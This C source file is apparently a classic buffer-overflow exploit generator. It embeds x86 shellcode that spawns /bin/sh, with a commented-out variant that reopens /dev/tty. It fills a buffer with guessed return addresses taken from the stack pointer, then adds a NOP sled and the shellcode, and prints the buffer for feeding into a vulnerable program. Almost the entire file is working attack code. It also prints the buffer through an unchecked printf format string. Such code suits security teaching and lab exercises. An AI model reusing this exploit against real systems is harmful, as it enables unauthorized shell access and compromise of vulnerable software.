#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_BSIZE 706
#define NOP 0x90

// Shellcode for exec of /bin/sh

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

/*
char shellcode[] = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
*/

unsigned long get_sp(void) {
  __asm__("movl %esp, %eax");
}

void main(int argc, char* argv[]) {
  char buff[DEFAULT_BSIZE];
  char *ptr;
  long *long_ptr, addr;
  int i = 0;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BSIZE;

  if (argc > 1) offset = atoi(argv[1]);

  //printf("Offset is: %d\n", offset);
  //printf("Stack Pointer is: 0x%x\n", get_sp()); 
  addr = get_sp() - offset;
  //printf("Using address: 0x%x\n", addr);

  ptr = buff;
  // Shifting by 3 align the addresses with the word boundary when
  // smashing the stack
  long_ptr = (long *) (ptr);
  //First we fill the buffer with our best guess of the address for
  //the buffer in the attacked program
char *temp = ptr;
  for (i = 0; temp < (buff+bsize); i++) {
    *(temp++) = NOP;
  }

  printf("Using address: 0x%x\n", addr);
  for (i = 0; long_ptr < (buff + 560); i += 4) {
	*(long_ptr++) = addr;
  }

  // Setup the nop sled
  //long_ptr = (long *) (ptr + 54);
  char *buf_ptr = (char *) (ptr + 560); 
  for (i = (buff + 560); i < (buff + bsize); ++i) {
    *(buf_ptr++) = NOP;
    //buff[i] = NOP;
  }

  // Insert our shellcode
  //ptr = (buff + bufsize - 72); 
  ptr = (buff + 660);
  //printf("size of shell code: %d\n", strlen(shellcode));
  for (i = 0; i < strlen(shellcode); ++i) {
    *(ptr++) = shellcode[i];
  }
//printf("Size of shell code: %d\n", strlen(shellcode));
/*  printf("Address of buf: 0x%x\n", ptr);
  printf("Ending address of buf: 0x%x\n", (buff + bsize));
  printf("Address of nop 0x%x\n", (ptr + 60));
  printf("Address of shellcode: 0x%x\n", (buff + 120));
*/
  buff[bsize-1] = '\0';
  printf(buff);
  return;
}
